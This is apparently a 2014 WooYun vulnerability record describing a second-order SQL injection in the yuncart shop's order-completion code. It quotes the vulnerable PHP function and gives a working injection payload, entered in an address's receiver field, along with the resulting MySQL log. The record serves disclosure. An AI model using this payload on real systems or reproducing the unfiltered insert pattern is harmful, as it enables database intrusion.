{"id": 41824, "wybug_id": "wooyun-2014-087561", "wybug_title": "yuncart二次注入", "wybug_corp": "yuncart", "wybug_author": "darker", "wybug_date": "2014-12-18 16:44", "wybug_open_date": "2015-03-18 16:46", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： yuncart 二次注入 详细说明：  /include/front/buy.class.phpordercomp()执行insert 操作未对数据过滤导致注入。\npublic function ordercomp() {\t\t\t\t$time = time();\t\t//判断订单执行条件\t\t//购物车\t\t$carts = $_SESSION[\"cart\"][\"list\"];\t\tif(!$carts) {\t\t\tredirect(array(\"index\",\"cart\"));\t\t}\t\t//收货地址\t\t$addressid = intval($_POST[\"addressid\"]);\t\t$address = DB::getDB()->selectrow(\"user_address\",\"*\",\"uid=\".$this->uid.\" AND addressid='$addressid'\");\t\tif(!$address) cerror(__(\"error_address\"));\t\t\t\t//支付方式\t\t$paymentid\t= intval($_POST[\"paymentid\"]);\t\t$payment\t= DB::getDB()->selectrow(\"payment\",\"code,paymentid\",\"ispublish=1 AND paymentid='$paymentid'\");\t\tif(!$payment) cerror(__(\"cannt_user_thepayment\"));\t\t$paymentcode\t= $payment['code'];\t\t//快递\t\t$wayid\t\t= intval($_POST[\"wayid\"]);\t\t$way\t\t= DB::getDB()->selectrow(\"express_way\",\"*\",\"wayid='$wayid'\");\t\tif(!$way) cerror(__(\"error_expressway\"));\t\t\t\t$man\t = Promotion::getManRule($_SESSION['cart']['itemfee'],true);\t\t$postfee = 0;\t\tif(!$man || !empty($man['nofreight'])) { //订单免运费\t\t\t//第一级，自定义省\t\t\t$postfee = DB::getDB()->selectval(\"express_prov\",\"price\",\"wayid='$wayid' AND province like '%{$address['province']}%'\");\t\t\t//第二级，默认\t\t\tif(!$postfee && $way['price']) $postfee = $way['price'];\t\t\t//两级都不存在，报错\t\t    !$postfee && cerror(__(\"error_expressway\"));\t\t}\t\t\t\t\t\t$postfee  = $postfee ? getPrice($postfee,-2,'float') : 0;\t\t$posttype = intval($_POST[\"posttype\"]);\t\t\t\t\t\t//接受其他参数\t\t$memo  = trim($_POST[\"memo\"]);\t\t$istax = isset($_POST[\"istax\"])?1:0;\t\t$tax_company = $istax?trim($_POST[\"tax_company\"]):\"\";\t\t\t\t//订单商品\t\t$cartitems = $this->getCartItems();\t\t\t\t//套餐\t\t$mealid = $mealnum = 0;\t\tif(!empty($_SESSION['cart']['meal'])) { //如果是套餐订单，扯分\t\t\t$temp = array();\t\t\tforeach($cartitems as $k=>$cartitem) {\t\t\t\tif($cartitem['type'] == \"meal\") { //如果是套餐\t\t\t\t\t$mealnum  = $cartitem['num'];\t\t\t\t\t$mealid   = $cartitem['mealid'];\t\t\t\t\t\t\t\t\t\t//判断套餐库存\t\t\t\t\t$inventory = DB::getDB()->selectval(\"meal\",\"inventory\",\"mealid='$mealid'\");\t\t\t\t\tif(!$inventory || $mealnum > $inventory) {\t\t\t\t\t\tcerror(__('inventory_not_enough'));\t\t\t\t\t}\t\t\t\t\tforeach($cartitem['mealitems'] as $mealitem) {\t\t\t\t\t\t$mealitem['num']\t\t= $cartitem['num'];\t\t\t\t\t\t$mealitem['mealid']\t\t= $cartitem['mealid'];\t\t\t\t\t\t$mealitem['mealtitle']\t= $cartitem['title'];\t\t\t\t\t\t$temp[]\t\t\t= $mealitem;\t\t\t\t\t}\t\t\t\t\tbreak;\t\t\t\t} \t\t\t}\t\t\t$cartitems = $temp;\t\t}\t\t\t\t//商品bn，检查库存是否满足\t\t$itemids = $productids = array();\t\tforeach($cartitems as $cartitem) {\t\t\t$itemids[] = $cartitem['itemid'];\t\t\tisset($cartitem['productid']) && ($productids[] = $cartitem['productid']);\t\t}\t\t$items\t= DB::getDB()->select(\"item\",\"inventory,bn,itemid\",\"itemid in \".cimplode($itemids),\"\",\"\",\"itemid\");\t\t$products = DB::getDB()->select(\"product\",\"inventory,bn,productid\",\"productid in \".cimplode($productids),\"\",\"\",\"productid\");\t\t\t\t$items[0]['bn'] = $products[0]['bn'] = '';\t\tforeach($cartitems as $k => $cartitem) {//检查库存\t\t\t$itemid\t\t= $cartitem['itemid'];\t\t\t$productid\t= !empty($cartitem['productid'])?$cartitem['productid']:0;\t\t\t$num\t\t= $cartitem['num'];\t\t\tif(!$num) { //如果数量不存在，直接unset\t\t\t\tunset($cartitems[$k]);\t\t\t} else if( ($productid  && $num> $products[$productid]['inventory']  ) || ($itemid && $num > $items[$itemid]['inventory']) ) { \t\t\t\t//如果productid存在，库存小\t\t\t\tcerror(__('inventory_not_enough'));\t\t\t} \t\t}\t\t\t\t//订单数据 trade\t\t$itemfee  =  $_SESSION['cart']['itemfee'];\t\t$totalfee =\t $itemfee //商品的费用\t\t\t\t\t + ($man && !empty($man['nofreight']) ? 0 : $postfee)\t\t//包邮\t\t\t\t\t - ($man && !empty($man['minus']) ? $man['minus'] : 0)\t\t//减金额\t\t\t\t\t;\t\t\t\t//优惠券\t\t$couponid = isset($_POST[\"couponid\"]) ? $_POST[\"couponid\"] : 0;\t\t$coupon\t  = array();\t\tif($couponid) {//判断优惠券是否存在\t\t\t$coupon\t\t= Promotion::getCoupon($this->uid,$couponid);\t\t\tif( $coupon && $coupon['deno'] && ($coupon['require'] <= $totalfee) ) { //优惠券\t\t\t\t$totalfee -= $coupon['deno'];\t\t\t} else {\t//优惠券不可用\t\t\t\tcerror(__(\"coupon_cannot_use\"));\t\t\t}\t\t}\t\t$totalfee < 0 && $totalfee = 0;\t\t\t\t//正式进入执行订单流程\t\tif(isset($_SESSION['cart']['in'])) { //重复执行订单\t\t\tunset($_SESSION['cart']);\t\t\tcerror(__(\"submit_order_twice\"));\t\t}\t\t$_SESSION['cart']['in'] = true;//正在执行订单\t\t$tradeid = $time . mt_rand(100,999);\t\t$data = array(\t\t\t\"tradeid\"\t\t\t=> $tradeid,\t\t\t\"uid\"\t\t\t\t=> $this->uid,\t\t\t\"uname\"\t\t\t\t=> $_SESSION['uname'],\t\t\t\"addtime\"\t\t\t=> $time,\t\t\t\"status\"\t\t\t=> \"WAIT_PAY\",//未支付\t\t\t\"totalfee\"\t\t\t=> getPrice($totalfee,2,'int'),\t\t\t\"itemfee\"\t\t\t=> getPrice($itemfee,2,'int'),\t\t\t\"postfee\"\t\t\t=> getPrice($postfee,2,'int'),\t\t\t\"man\"\t\t\t\t=> $man ? $man['str'] : '',\t\t\t\"coupon\"\t\t\t=> $coupon ? $coupon['deno'] : 0,\t\t\t\"expresswayid\"\t\t=> $wayid,\t\t\t\"posttype\"\t\t\t=> $posttype,\t\t\t\"receiver_name\"\t\t=> $address['receiver'],\t\t\t\"receiver_province\" => $address['province'],\t\t\t\"receiver_city\"\t\t=> $address['city'],\t\t\t\"receiver_district\" => $address['district'],\t\t\t\"receiver_address\"  => $address['address'],\t\t\t\"receiver_zip\"\t    => $address['zipcode'],\t\t\t\"receiver_link\"     => $address['link'],\t\t\t\"memo\"\t\t\t\t=> $memo,\t\t\t\"payment\"\t\t\t=> $paymentcode,\t\t\t\"istax\"\t\t\t\t=> $istax,\t\t\t\"tax_company\"\t\t=> $tax_company\t\t);\t\tDB::getDB()->insert(\"trade\",$data);\t\t$adddata\t= $promodata\t= array();\t\t\t\t//订单\t\tforeach($cartitems as $cartitem) { //组装order表数据\t\t\t$itemid\t\t= $cartitem['itemid'];\t\t\t$productid\t= !empty($cartitem['productid'])?$cartitem['productid']:0;\t\t\t$num\t\t= $cartitem['num'];\t\t\t$adddata\t= array(\"tradeid\"\t=>$tradeid,\t\t\t\t\t\t\t\t\"ibn\"\t\t=>$items[$itemid]['bn'],\t\t\t\t\t\t\t\t\"pbn\"\t\t=>$products[$productid]['bn'],\t\t\t\t\t\t\t    \"itemid\"\t=>$itemid,\t\t\t\t\t\t\t    \"productid\"\t=>$productid,\t\t\t\t\t\t\t    \"itemname\"\t=>$cartitem['itemname'],\t\t\t\t\t\t\t    \"itemimg\"\t=>$cartitem['itemimg'],\t\t\t\t\t\t\t    \"num\"\t\t=>$num,\t\t\t\t\t\t\t    \"price\"\t\t=>getPrice($cartitem['price'],2,'int'),\t\t\t\t\t\t\t\t\"uid\"\t\t=>$this->uid,\t\t\t\t\t\t\t\t\"uname\"\t\t=>$_SESSION['uname'],\t\t\t\t\t\t\t\t\"addtime\"\t=>$time\t\t\t);\t\t\t//搭配套餐\t\t\tif(isset($cartitem['mealid'])) {\t\t\t\t$adddata[\"mealtitle\"]\t= $cartitem[\"mealtitle\"];\t\t\t}\t\t\t//限时打折\t\t\tif(isset($cartitem['discount'])) {\t\t\t\t$adddata['discount'] = getPrice($cartitem['discount']['oldprice'] - $cartitem['discount']['newprice'],2,'int');\t\t\t} else if(isset($cartitem['tuan'])) {\t\t\t\t$adddata['tuan']\t = getPrice($cartitem['tuan']['oldprice']\t  -\t$cartitem['tuan']['newprice'],2,'int');\t\t\t}\t\t\t\t\t\t\t\t\t//插入订单表\t\t\t$orderid = DB::getDB()->insert(\"order\",$adddata);\t\t\t\t\t\tif(!empty($cartitem['gifts'])) {//赠品\t\t\t   $giftdata = array(\"tradeid\"\t=> $tradeid,\t\t\t\t\t\t\t\t \"orderid\"\t=> $orderid,\t\t\t\t\t\t\t\t \"itemid\"\t=> $itemid,\t\t\t\t\t\t\t\t \"productid\"=> $productid,\t\t\t\t\t\t\t\t \"gift\"\t\t=> serialize($cartitem['gifts']));\t\t\t   DB::getDB()->insert(\"trade_gift\",$giftdata);\t\t\t}\t\t\t\t\t\t//减去product库存\t\t\tif($productid) {\t\t\t\tDB::getDB()->updatecre(\"product\",\"inventory\",\"productid='$productid'\",'decre',$num);\t\t\t}\t\t\t//减去item库存\t\t\tDB::getDB()->updatecremulti(\"item\",array(\"inventory\"=>\"- $num\",\"modified\"=>$time),\"itemid='$itemid'\");\t\t\t\t//tuan buynum\t\t\tif(isset($cartitem['tuan'])) {\t\t\t\tDB::getDB()->updatecremulti(\"tuan\",array(\"buynum\"=>\"+ $num\"),\"tuanid='\".$cartitem[\"tuan\"][\"tuanid\"].\"'\");\t\t\t}\t\t}\t\t\t\t//更新优惠券已经使用及相关订单\t\tif($coupon) {\t\t\tDB::getDB()->update(\"user_coupon\",\"isused=1,tradeid='$tradeid'\",\"uid='\".$this->uid.\"' AND couponid='\".$coupon['couponid'].\"'\");\t\t}\t\t\t\t//如果是套餐订单，更新套餐的库存和volume\t\tif($mealid && $mealnum) {\t\t\tDB::getDB()->updatecremulti(\"meal\",array(\"inventory\"=>\"- $mealnum\",\"volume\"=>\"+ $mealnum\"),\"mealid='$mealid'\");\t\t}\t\tunset($_SESSION[\"cart\"]);\t\t$this->data['tradeid'] = $tradeid;\t\t$this->data['total']   = $totalfee;\t\t$this->data['paymentcode'] = $paymentcode;\t\t//发送消息通知\t\t$mq = new MQ(\"tradecreated\");\t\t$mq->send($this->uid,array(\t\t\t\"mobile\"\t\t=> $address[\"link\"],\t\t\t\"replacement\"\t=> array($tradeid,getPrice($totalfee,0))\t\t));\t\t//订单处理结束\t\t$this->output(\"ordercomp\");\t}\n添加地址:\n\nreceiver=',1,1,1,user(),1,1,1,1,0,2)#提交订单:执行INSERT语句mysql log:INSERT INTO cart_trade(`tradeid`,`uid`,`uname`,`addtime`,`status`,`totalfee`,`itemfee`,`postfee`,`man`,`coupon`,`expresswayid`,`posttype`,`receiver_name`,`receiver_province`,`receiver_city`,`receiver_district`,`receiver_address`,`receiver_zip`,`receiver_link`,`memo`,`payment`,`istax`,`tax_company`) values('1418809144596',2,'test',1418809144,'WAIT_PAY',6300,5300,1000,'',0,2,1,'',1,1,1,user(),1,1,1,1,0,2)#','110000','1','','1','1','1','','cod',0,'')   漏洞证明：  \n\n   修复方案：  过滤。   版权声明：转载请注明来源 darker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}